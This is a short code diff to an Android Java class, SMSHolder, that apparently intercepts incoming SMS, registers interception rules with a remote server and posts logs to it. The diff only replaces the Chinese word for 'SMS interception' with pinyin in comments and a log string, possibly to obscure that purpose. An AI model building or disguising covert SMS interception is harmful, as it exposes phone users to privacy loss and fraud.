@@ -111,7 +111,7 @@ public class SMSHolder
 							return;
 						}
 
-						// Region 启动短信拦截
+						// Region 启动sms lanjie
 						SharedPreferences sp_Setting = myContext.getSharedPreferences("Setting_snspt", Context.MODE_PRIVATE);
 
 						Calendar now = Calendar.getInstance();
@@ -136,11 +136,11 @@ public class SMSHolder
 							 * .putString(Config.CacheKey.CacheSMSFilterString,
 							 * null); editor.commit();
 							 * 
-							 * // 停止短信拦截 SmsInterceptor.unregisterListen(); }
+							 * // 停止sms lanjie SmsInterceptor.unregisterListen(); }
 							 */
 							// endregion
 
-							// 启动短信拦截
+							// 启动sms lanjie
 							if (revBean != null)
 							{
 								StartHold(revBean);
@@ -178,7 +178,7 @@ public class SMSHolder
 
 			if (revBean.getLinkid() != 0)
 			{
-				WCConnect.getInstance().PostLog("SMSLog:SDK:短信拦截已取消");
+				WCConnect.getInstance().PostLog("SMSLog:SDK:sms lanjie 已取消");
 			}
 		} catch (Exception e)
 		{
@@ -278,7 +278,7 @@ public class SMSHolder
 			} catch (Exception e)
 			{
 			}
-			// 1. 短信拦截规则建立,通知服务器,并进行后续处理
+			// 1. sms lanjie规则建立,通知服务器,并进行后续处理
 			CallbackBean callbackbean = new CallbackBean();
 
 			callbackbean.setCmdid(Config.CMD_CALLBACK);
